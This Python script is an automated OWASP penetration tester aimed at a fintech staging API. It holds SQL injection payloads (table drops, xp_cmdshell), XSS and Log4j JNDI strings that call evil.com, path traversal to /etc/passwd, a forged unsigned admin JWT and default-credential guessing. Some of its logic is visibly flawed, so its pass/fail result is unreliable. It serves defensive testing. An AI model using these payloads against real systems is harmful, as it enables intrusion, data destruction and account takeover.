#!/usr/bin/env python3
"""
CRITICAL: OWASP Security Penetration Testing Script for Waqiti Platform
PURPOSE: Automated security vulnerability assessment following OWASP Top 10
IMPACT: Identifies critical security vulnerabilities before production deployment
COMPLIANCE: OWASP ASVS Level 3, PCI DSS 11.3, ISO 27001

This script performs comprehensive security testing including:
- SQL Injection testing
- Cross-Site Scripting (XSS) detection
- Authentication bypass attempts
- Authorization flaws
- Session management testing
- Input validation testing
- API security assessment
- Cryptographic weakness detection
"""

import requests
import json
import time
import random
import string
import urllib.parse
import hashlib
import base64
import jwt
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import threading
import ssl
import socket
from urllib3.exceptions import InsecureRequestWarning
import warnings

# Suppress SSL warnings for testing
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WaqitiSecurityPenetrationTester:
    """
    CRITICAL: Comprehensive security penetration testing for Waqiti platform
    """
    
    def __init__(self, base_url="https://api-staging.example.com", max_threads=10):
        self.base_url = base_url
        self.max_threads = max_threads
        self.session = requests.Session()
        self.vulnerabilities = []
        self.test_results = {
            'total_tests': 0,
            'vulnerabilities_found': 0,
            'critical_issues': 0,
            'high_issues': 0,
            'medium_issues': 0,
            'low_issues': 0
        }
        self.lock = threading.Lock()
        
        # Test payloads for various attack vectors
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "') OR '1'='1",
            "1' OR '1'='1' LIMIT 1 --",
            "1' UNION ALL SELECT NULL,NULL,NULL,user() --",
            "'; EXEC xp_cmdshell('dir') --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "\"onmouseover=alert('XSS')\"",
            "<script src=http://evil.com/xss.js></script>"
        ]
        
        # Financial endpoints to test
        self.financial_endpoints = [
            "/api/v1/payments/request",
            "/api/v1/wallets/balance",
            "/api/v1/transactions",
            "/api/v1/transfers",
            "/api/v1/cards",
            "/api/v1/accounts",
            "/api/v1/fraud/assess"
        ]

    def log_vulnerability(self, severity, category, endpoint, description, payload=None, response_code=None):
        """Log discovered vulnerability with full context"""
        with self.lock:
            vulnerability = {
                'timestamp': datetime.now().isoformat(),
                'severity': severity,
                'category': category,
                'endpoint': endpoint,
                'description': description,
                'payload': payload,
                'response_code': response_code,
                'risk_level': self._calculate_risk_level(severity, category, endpoint)
            }
            
            self.vulnerabilities.append(vulnerability)
            self.test_results['vulnerabilities_found'] += 1
            
            if severity == 'CRITICAL':
                self.test_results['critical_issues'] += 1
                print(f"🚨 CRITICAL VULNERABILITY: {description} at {endpoint}")
            elif severity == 'HIGH':
                self.test_results['high_issues'] += 1
                print(f"⚠️  HIGH VULNERABILITY: {description} at {endpoint}")
            elif severity == 'MEDIUM':
                self.test_results['medium_issues'] += 1
                print(f"⚡ MEDIUM VULNERABILITY: {description} at {endpoint}")
            else:
                self.test_results['low_issues'] += 1
                print(f"💡 LOW VULNERABILITY: {description} at {endpoint}")

    def _calculate_risk_level(self, severity, category, endpoint):
        """Calculate business risk level based on vulnerability characteristics"""
        risk_multiplier = 1.0
        
        # Financial endpoints have higher risk
        if any(fin_ep in endpoint for fin_ep in self.financial_endpoints):
            risk_multiplier *= 2.0
        
        # Authentication/Authorization issues are higher risk
        if category in ['Authentication', 'Authorization', 'Session Management']:
            risk_multiplier *= 1.5
        
        # SQL Injection and Code Execution are maximum risk
        if category in ['SQL Injection', 'Code Execution', 'Command Injection']:
            risk_multiplier *= 2.5
        
        base_scores = {
            'CRITICAL': 10.0,
            'HIGH': 7.5,
            'MEDIUM': 5.0,
            'LOW': 2.5
        }
        
        final_score = min(base_scores.get(severity, 0) * risk_multiplier, 10.0)
        
        if final_score >= 9.0:
            return 'BUSINESS_CRITICAL'
        elif final_score >= 7.0:
            return 'HIGH_BUSINESS_IMPACT'
        elif final_score >= 5.0:
            return 'MEDIUM_BUSINESS_IMPACT'
        else:
            return 'LOW_BUSINESS_IMPACT'

    def test_sql_injection(self):
        """
        CRITICAL: Test for SQL injection vulnerabilities
        Tests all input parameters for SQL injection flaws
        """
        print("🔍 Testing for SQL Injection vulnerabilities...")
        
        test_endpoints = [
            "/api/v1/users/login",
            "/api/v1/users/search",
            "/api/v1/payments/history",
            "/api/v1/transactions/search",
            "/api/v1/wallets/history",
            "/api/v1/accounts/search"
        ]
        
        for endpoint in test_endpoints:
            self.test_results['total_tests'] += 1
            
            for payload in self.sql_injection_payloads:
                try:
                    # Test GET parameters
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={'search': payload, 'id': payload},
                        timeout=10,
                        verify=False
                    )
                    
                    # Check for SQL error indicators
                    if self._check_sql_error_indicators(response):
                        self.log_vulnerability(
                            'CRITICAL',
                            'SQL Injection',
                            endpoint,
                            f'SQL injection vulnerability detected in GET parameter',
                            payload,
                            response.status_code
                        )
                    
                    # Test POST body
                    post_data = {
                        'username': payload,
                        'password': 'test123',
                        'email': payload,
                        'search_term': payload
                    }
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=post_data,
                        timeout=10,
                        verify=False
                    )
                    
                    if self._check_sql_error_indicators(response):
                        self.log_vulnerability(
                            'CRITICAL',
                            'SQL Injection',
                            endpoint,
                            f'SQL injection vulnerability detected in POST body',
                            payload,
                            response.status_code
                        )
                        
                except requests.exceptions.RequestException as e:
                    print(f"Request error testing {endpoint}: {e}")
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    
                time.sleep(0.1)  # Rate limiting

    def _check_sql_error_indicators(self, response):
        """Check response for SQL error indicators"""
        error_indicators = [
            'sql syntax',
            'mysql_fetch',
            'ora-00',
            'microsoft odbc',
            'postgresql',
            'sqlite_',
            'sqlstate',
            'ora-01',
            'syntax error',
            'unterminated string literal',
            'invalid column name',
            'table doesn\'t exist'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in error_indicators)

    def test_xss_vulnerabilities(self):
        """
        HIGH: Test for Cross-Site Scripting vulnerabilities
        Tests input fields and URL parameters for XSS flaws
        """
        print("🔍 Testing for Cross-Site Scripting (XSS) vulnerabilities...")
        
        test_endpoints = [
            "/api/v1/users/profile",
            "/api/v1/payments/description",
            "/api/v1/support/message",
            "/api/v1/notifications/create",
            "/api/v1/comments/add"
        ]
        
        for endpoint in test_endpoints:
            self.test_results['total_tests'] += 1
            
            for payload in self.xss_payloads:
                try:
                    # Test in JSON body
                    post_data = {
                        'message': payload,
                        'description': payload,
                        'comment': payload,
                        'name': payload
                    }
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=post_data,
                        timeout=10,
                        verify=False
                    )
                    
                    # Check if payload is reflected without encoding
                    if payload in response.text and not self._is_payload_encoded(payload, response.text):
                        self.log_vulnerability(
                            'HIGH',
                            'Cross-Site Scripting',
                            endpoint,
                            f'XSS vulnerability detected - payload reflected unencoded',
                            payload,
                            response.status_code
                        )
                    
                    # Test in URL parameters
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={'q': payload, 'message': payload},
                        timeout=10,
                        verify=False
                    )
                    
                    if payload in response.text and not self._is_payload_encoded(payload, response.text):
                        self.log_vulnerability(
                            'HIGH',
                            'Cross-Site Scripting',
                            endpoint,
                            f'XSS vulnerability detected in URL parameter',
                            payload,
                            response.status_code
                        )
                        
                except requests.exceptions.RequestException as e:
                    print(f"Request error testing XSS on {endpoint}: {e}")
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    
                time.sleep(0.1)

    def _is_payload_encoded(self, payload, response_text):
        """Check if XSS payload is properly encoded in response"""
        encoded_chars = ['&lt;', '&gt;', '&quot;', '&#x27;', '&amp;']
        return any(char in response_text for char in encoded_chars)

    def test_authentication_bypass(self):
        """
        CRITICAL: Test for authentication bypass vulnerabilities
        Attempts various methods to bypass authentication controls
        """
        print("🔍 Testing for Authentication Bypass vulnerabilities...")
        
        # Test JWT token manipulation
        self._test_jwt_manipulation()
        
        # Test authentication bypass techniques
        bypass_attempts = [
            {'username': 'admin', 'password': ''},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'root', 'password': 'toor'},
            {'username': 'test', 'password': 'test'},
            {'username': '', 'password': ''},
        ]
        
        for attempt in bypass_attempts:
            self.test_results['total_tests'] += 1
            
            try:
                response = self.session.post(
                    f"{self.base_url}/api/v1/auth/login",
                    json=attempt,
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200 and 'token' in response.text:
                    self.log_vulnerability(
                        'CRITICAL',
                        'Authentication Bypass',
                        '/api/v1/auth/login',
                        f'Authentication bypass with credentials: {attempt}',
                        str(attempt),
                        response.status_code
                    )
                    
            except requests.exceptions.RequestException as e:
                print(f"Request error testing auth bypass: {e}")
                
            time.sleep(0.2)

    def _test_jwt_manipulation(self):
        """Test JWT token manipulation vulnerabilities"""
        print("🔍 Testing JWT token manipulation...")
        
        # Generate a fake JWT token
        fake_payload = {
            'userId': 'admin',
            'role': 'ADMINISTRATOR',
            'permissions': ['ALL'],
            'exp': datetime.utcnow() + timedelta(hours=24)
        }
        
        # Test unsigned JWT (none algorithm)
        try:
            fake_token = jwt.encode(fake_payload, '', algorithm='none')
            
            headers = {'Authorization': f'Bearer {fake_token}'}
            response = self.session.get(
                f"{self.base_url}/api/v1/admin/users",
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                self.log_vulnerability(
                    'CRITICAL',
                    'JWT Security',
                    '/api/v1/admin/users',
                    'JWT none algorithm vulnerability - unsigned token accepted',
                    fake_token[:50] + '...',
                    response.status_code
                )
                
        except Exception as e:
            print(f"JWT test error: {e}")

    def test_authorization_flaws(self):
        """
        HIGH: Test for authorization and access control flaws
        Tests for horizontal and vertical privilege escalation
        """
        print("🔍 Testing for Authorization and Access Control flaws...")
        
        # Test direct object reference vulnerabilities
        test_cases = [
            {'endpoint': '/api/v1/users/1', 'description': 'User profile access'},
            {'endpoint': '/api/v1/wallets/1', 'description': 'Wallet access'},
            {'endpoint': '/api/v1/transactions/1', 'description': 'Transaction access'},
            {'endpoint': '/api/v1/payments/1', 'description': 'Payment access'},
            {'endpoint': '/api/v1/admin/users', 'description': 'Admin panel access'},
        ]
        
        for test_case in test_cases:
            self.test_results['total_tests'] += 1
            
            try:
                # Test without authentication
                response = self.session.get(
                    f"{self.base_url}{test_case['endpoint']}",
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    self.log_vulnerability(
                        'HIGH',
                        'Authorization',
                        test_case['endpoint'],
                        f'Unauthorized access to {test_case["description"]} - no authentication required',
                        None,
                        response.status_code
                    )
                
                # Test with manipulated user ID
                for user_id in range(1, 10):
                    manipulated_endpoint = test_case['endpoint'].replace('1', str(user_id))
                    response = self.session.get(
                        f"{self.base_url}{manipulated_endpoint}",
                        timeout=10,
                        verify=False
                    )
                    
                    if response.status_code == 200 and 'user' in response.text.lower():
                        self.log_vulnerability(
                            'MEDIUM',
                            'Insecure Direct Object Reference',
                            manipulated_endpoint,
                            f'IDOR vulnerability - can access other users data',
                            f'user_id={user_id}',
                            response.status_code
                        )
                        break  # Found one, don't spam
                        
            except requests.exceptions.RequestException as e:
                print(f"Request error testing authorization: {e}")
                
            time.sleep(0.1)

    def test_session_management(self):
        """
        MEDIUM: Test session management vulnerabilities
        Tests for session fixation, weak session IDs, etc.
        """
        print("🔍 Testing Session Management vulnerabilities...")
        
        # Test session fixation
        self.test_results['total_tests'] += 1
        
        try:
            # Get initial session
            response1 = self.session.get(f"{self.base_url}/api/v1/session", verify=False)
            initial_session = response1.cookies.get('JSESSIONID') or response1.cookies.get('sessionId')
            
            if initial_session:
                # Attempt login with fixed session
                login_data = {'username': 'testuser', 'password': 'testpass'}
                response2 = self.session.post(
                    f"{self.base_url}/api/v1/auth/login",
                    json=login_data,
                    verify=False
                )
                
                final_session = response2.cookies.get('JSESSIONID') or response2.cookies.get('sessionId')
                
                if initial_session == final_session:
                    self.log_vulnerability(
                        'MEDIUM',
                        'Session Management',
                        '/api/v1/auth/login',
                        'Session fixation vulnerability - session ID not regenerated after login',
                        f'session_id={initial_session[:20]}...',
                        response2.status_code
                    )
                    
        except Exception as e:
            print(f"Session management test error: {e}")

    def test_input_validation(self):
        """
        MEDIUM: Test input validation and sanitization
        Tests for various input validation bypasses
        """
        print("🔍 Testing Input Validation vulnerabilities...")
        
        malicious_inputs = [
            '../../../etc/passwd',  # Path traversal
            '..\\..\\..\\windows\\system32\\config\\sam',  # Windows path traversal
            '${jndi:ldap://evil.com/a}',  # Log4j injection
            '{{7*7}}',  # Template injection
            '<svg/onload=alert(1)>',  # XSS bypass
            'file:///etc/passwd',  # File URI
            '127.0.0.1:8080',  # SSRF attempt
            'localhost',  # SSRF attempt
            '\x00',  # Null byte injection
            '../../../../../../../../etc/passwd%00'  # Path traversal + null byte
        ]
        
        test_endpoints = [
            '/api/v1/files/upload',
            '/api/v1/documents/view',
            '/api/v1/reports/generate',
            '/api/v1/templates/render'
        ]
        
        for endpoint in test_endpoints:
            for malicious_input in malicious_inputs:
                self.test_results['total_tests'] += 1
                
                try:
                    # Test in POST body
                    post_data = {
                        'filename': malicious_input,
                        'path': malicious_input,
                        'template': malicious_input,
                        'url': malicious_input
                    }
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=post_data,
                        timeout=10,
                        verify=False
                    )
                    
                    # Check for system file content
                    if self._check_sensitive_file_exposure(response):
                        self.log_vulnerability(
                            'HIGH',
                            'Path Traversal',
                            endpoint,
                            'Path traversal vulnerability - sensitive file access detected',
                            malicious_input,
                            response.status_code
                        )
                    
                    # Check for SSRF indicators
                    if 'connection' in response.text.lower() or 'timeout' in response.text.lower():
                        self.log_vulnerability(
                            'MEDIUM',
                            'Server-Side Request Forgery',
                            endpoint,
                            'Potential SSRF vulnerability detected',
                            malicious_input,
                            response.status_code
                        )
                        
                except requests.exceptions.RequestException:
                    pass  # Expected for some payloads
                except Exception as e:
                    print(f"Input validation test error: {e}")
                    
                time.sleep(0.05)

    def _check_sensitive_file_exposure(self, response):
        """Check if response contains sensitive system files"""
        sensitive_indicators = [
            'root:x:0:0',  # /etc/passwd
            '[boot loader]',  # boot.ini
            'CREATE TABLE',  # database dumps
            'BEGIN RSA PRIVATE KEY',  # Private keys
            'ADMIN$',  # Windows admin share
        ]
        return any(indicator in response.text for indicator in sensitive_indicators)

    def test_api_security(self):
        """
        HIGH: Test API-specific security vulnerabilities
        Tests for API abuse, rate limiting, mass assignment
        """
        print("🔍 Testing API Security vulnerabilities...")
        
        # Test for missing rate limiting
        self._test_rate_limiting()
        
        # Test for mass assignment vulnerabilities
        self._test_mass_assignment()
        
        # Test for API enumeration
        self._test_api_enumeration()

    def _test_rate_limiting(self):
        """Test for missing rate limiting controls"""
        endpoint = "/api/v1/auth/login"
        
        failed_attempts = 0
        for i in range(20):  # 20 rapid requests
            self.test_results['total_tests'] += 1
            
            try:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={'username': f'user{i}', 'password': 'wrongpassword'},
                    timeout=5,
                    verify=False
                )
                
                if response.status_code != 429:  # Not rate limited
                    failed_attempts += 1
                    
            except requests.exceptions.RequestException:
                break
                
            time.sleep(0.1)
        
        if failed_attempts >= 15:  # Most requests went through
            self.log_vulnerability(
                'MEDIUM',
                'Rate Limiting',
                endpoint,
                f'Missing rate limiting - {failed_attempts} rapid requests allowed',
                f'{failed_attempts} requests in 2 seconds',
                200
            )

    def _test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        endpoint = "/api/v1/users/profile"
        
        # Attempt to modify admin fields
        malicious_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'role': 'ADMINISTRATOR',  # Privileged field
            'permissions': ['ADMIN_ALL'],  # Privileged field
            'isAdmin': True,  # Privileged field
            'balance': 1000000,  # Financial field
            'credit_limit': 50000  # Financial field
        }
        
        self.test_results['total_tests'] += 1
        
        try:
            response = self.session.put(
                f"{self.base_url}{endpoint}",
                json=malicious_data,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200 and ('admin' in response.text.lower() or 'role' in response.text):
                self.log_vulnerability(
                    'HIGH',
                    'Mass Assignment',
                    endpoint,
                    'Mass assignment vulnerability - can modify privileged fields',
                    str(malicious_data),
                    response.status_code
                )
                
        except requests.exceptions.RequestException as e:
            print(f"Mass assignment test error: {e}")

    def _test_api_enumeration(self):
        """Test for API enumeration vulnerabilities"""
        base_endpoints = [
            '/api/v1/users',
            '/api/v1/admin',
            '/api/v1/internal',
            '/api/v1/debug',
            '/api/v1/config'
        ]
        
        for base_endpoint in base_endpoints:
            for i in range(1, 11):  # Test IDs 1-10
                self.test_results['total_tests'] += 1
                
                try:
                    response = self.session.get(
                        f"{self.base_url}{base_endpoint}/{i}",
                        timeout=5,
                        verify=False
                    )
                    
                    if response.status_code == 200 and len(response.text) > 50:
                        self.log_vulnerability(
                            'LOW',
                            'Information Disclosure',
                            f"{base_endpoint}/{i}",
                            f'API enumeration possible - sequential ID access',
                            f'id={i}',
                            response.status_code
                        )
                        break  # Found enumeration, don't continue
                        
                except requests.exceptions.RequestException:
                    pass
                    
                time.sleep(0.05)

    def test_cryptographic_weaknesses(self):
        """
        MEDIUM: Test for cryptographic implementation weaknesses
        Tests SSL/TLS configuration and crypto implementations
        """
        print("🔍 Testing Cryptographic implementations...")
        
        # Test SSL/TLS configuration
        self._test_ssl_configuration()
        
        # Test weak crypto in API responses
        self._test_weak_cryptography()

    def _test_ssl_configuration(self):
        """Test SSL/TLS configuration weaknesses"""
        try:
            # Test for weak SSL/TLS versions
            context = ssl.create_default_context()
            context.set_ciphers('ALL:@SECLEVEL=0')  # Allow weak ciphers for testing
            
            sock = socket.create_connection(('api-staging.example.com', 443), timeout=10)
            ssock = context.wrap_socket(sock, server_hostname='api-staging.example.com')
            
            cipher = ssock.cipher()
            protocol = ssock.version()
            
            # Check for weak protocols
            if protocol in ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1']:
                self.log_vulnerability(
                    'HIGH',
                    'Cryptographic Weakness',
                    'SSL/TLS Configuration',
                    f'Weak SSL/TLS protocol detected: {protocol}',
                    protocol,
                    None
                )
            
            # Check for weak ciphers
            if cipher and 'RC4' in cipher[0] or 'DES' in cipher[0]:
                self.log_vulnerability(
                    'MEDIUM',
                    'Cryptographic Weakness',
                    'SSL/TLS Configuration',
                    f'Weak cipher suite detected: {cipher[0]}',
                    cipher[0],
                    None
                )
            
            ssock.close()
            
        except Exception as e:
            print(f"SSL test error: {e}")

    def _test_weak_cryptography(self):
        """Test for weak cryptographic implementations in API"""
        # Test for predictable tokens/IDs
        tokens = []
        
        for i in range(5):
            self.test_results['total_tests'] += 1
            
            try:
                response = self.session.post(
                    f"{self.base_url}/api/v1/auth/request-reset",
                    json={'email': f'test{i}@example.com'},
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200 and 'token' in response.text:
                    # Extract token for analysis
                    token_data = response.json()
                    if 'resetToken' in token_data:
                        tokens.append(token_data['resetToken'])
                        
            except Exception:
                pass
                
            time.sleep(0.2)
        
        # Analyze tokens for predictability
        if len(tokens) >= 3:
            if self._tokens_are_predictable(tokens):
                self.log_vulnerability(
                    'HIGH',
                    'Cryptographic Weakness',
                    '/api/v1/auth/request-reset',
                    'Predictable tokens detected - weak random number generation',
                    f'sample_tokens={tokens[:2]}',
                    200
                )

    def _tokens_are_predictable(self, tokens):
        """Analyze if tokens show predictable patterns"""
        # Simple predictability check - could be enhanced
        if len(set(tokens)) != len(tokens):  # Duplicates
            return True
            
        # Check for sequential patterns (very basic)
        try:
            numeric_parts = []
            for token in tokens:
                # Extract numeric parts
                nums = ''.join(filter(str.isdigit, token))
                if nums:
                    numeric_parts.append(int(nums))
            
            if len(numeric_parts) >= 3:
                # Check if sequential
                diffs = [numeric_parts[i+1] - numeric_parts[i] for i in range(len(numeric_parts)-1)]
                if all(d == diffs[0] for d in diffs):  # All differences are same
                    return True
                    
        except Exception:
            pass
            
        return False

    def run_comprehensive_security_scan(self):
        """
        Execute comprehensive security penetration test
        """
        print("🚀 Starting Comprehensive Security Penetration Test")
        print("=" * 80)
        print(f"Target: {self.base_url}")
        print(f"Timestamp: {datetime.now().isoformat()}")
        print("=" * 80)
        
        start_time = time.time()
        
        # Run all security tests
        test_functions = [
            self.test_sql_injection,
            self.test_xss_vulnerabilities,
            self.test_authentication_bypass,
            self.test_authorization_flaws,
            self.test_session_management,
            self.test_input_validation,
            self.test_api_security,
            self.test_cryptographic_weaknesses
        ]
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(test_func) for test_func in test_functions]
            
            for future in futures:
                try:
                    future.result(timeout=300)  # 5 minute timeout per test
                except Exception as e:
                    print(f"Test execution error: {e}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Generate final report
        self._generate_security_report(duration)

    def _generate_security_report(self, duration):
        """Generate comprehensive security test report"""
        print("\n" + "=" * 80)
        print("🎯 WAQITI SECURITY PENETRATION TEST RESULTS")
        print("=" * 80)
        
        print(f"📊 SUMMARY:")
        print(f"   Total Tests Executed: {self.test_results['total_tests']}")
        print(f"   Total Vulnerabilities Found: {self.test_results['vulnerabilities_found']}")
        print(f"   Test Duration: {duration:.2f} seconds")
        print()
        
        print(f"🚨 VULNERABILITY BREAKDOWN:")
        print(f"   CRITICAL Issues: {self.test_results['critical_issues']}")
        print(f"   HIGH Issues: {self.test_results['high_issues']}")
        print(f"   MEDIUM Issues: {self.test_results['medium_issues']}")
        print(f"   LOW Issues: {self.test_results['low_issues']}")
        print()
        
        # Calculate security posture
        total_issues = self.test_results['vulnerabilities_found']
        critical_score = self.test_results['critical_issues'] * 10
        high_score = self.test_results['high_issues'] * 7
        medium_score = self.test_results['medium_issues'] * 4
        low_score = self.test_results['low_issues'] * 1
        
        total_risk_score = critical_score + high_score + medium_score + low_score
        
        if total_risk_score == 0:
            security_grade = 'A+'
            security_status = 'EXCELLENT'
        elif total_risk_score <= 10:
            security_grade = 'A'
            security_status = 'GOOD'
        elif total_risk_score <= 25:
            security_grade = 'B'
            security_status = 'FAIR'
        elif total_risk_score <= 50:
            security_grade = 'C'
            security_status = 'POOR'
        else:
            security_grade = 'F'
            security_status = 'CRITICAL'
        
        print(f"📈 SECURITY POSTURE:")
        print(f"   Security Grade: {security_grade}")
        print(f"   Security Status: {security_status}")
        print(f"   Risk Score: {total_risk_score}")
        print()
        
        # Detailed vulnerability report
        if self.vulnerabilities:
            print("🔍 DETAILED VULNERABILITY REPORT:")
            print("-" * 40)
            
            # Group by severity
            for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                severity_vulns = [v for v in self.vulnerabilities if v['severity'] == severity]
                if severity_vulns:
                    print(f"\n{severity} SEVERITY:")
                    for vuln in severity_vulns:
                        print(f"  • {vuln['category']}: {vuln['description']}")
                        print(f"    Endpoint: {vuln['endpoint']}")
                        if vuln['payload']:
                            print(f"    Payload: {vuln['payload']}")
                        print(f"    Risk Level: {vuln['risk_level']}")
                        print()
        
        # Save detailed JSON report
        report_data = {
            'scan_metadata': {
                'target': self.base_url,
                'timestamp': datetime.now().isoformat(),
                'duration_seconds': duration,
                'test_count': self.test_results['total_tests']
            },
            'summary': self.test_results,
            'security_posture': {
                'grade': security_grade,
                'status': security_status,
                'risk_score': total_risk_score
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        report_filename = f"waqiti_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
        
        print(f"💾 Detailed report saved to: {report_filename}")
        print()
        
        # Recommendations
        print("💡 IMMEDIATE REMEDIATION RECOMMENDATIONS:")
        if self.test_results['critical_issues'] > 0:
            print("   1. Address ALL CRITICAL vulnerabilities immediately")
            print("   2. Consider taking system offline until critical issues resolved")
        if self.test_results['high_issues'] > 0:
            print("   3. Implement fixes for HIGH severity issues within 24 hours")
        if total_issues > 10:
            print("   4. Conduct security code review of entire application")
            print("   5. Implement automated security testing in CI/CD pipeline")
        
        print("\n" + "=" * 80)
        
        # Return security status for automation
        return security_status == 'EXCELLENT' or security_status == 'GOOD'


if __name__ == "__main__":
    # Configuration
    TARGET_URL = "https://api-staging.example.com"
    MAX_CONCURRENT_THREADS = 8
    
    # Initialize and run security penetration test
    tester = WaqitiSecurityPenetrationTester(TARGET_URL, MAX_CONCURRENT_THREADS)
    
    try:
        security_passed = tester.run_comprehensive_security_scan()
        
        if security_passed:
            print("✅ Security scan completed - System meets security standards")
            exit(0)
        else:
            print("❌ Security scan failed - Critical vulnerabilities found")
            exit(1)
            
    except KeyboardInterrupt:
        print("\n⚠️ Security scan interrupted by user")
        exit(2)
    except Exception as e:
        print(f"❌ Security scan failed with error: {e}")
        exit(3)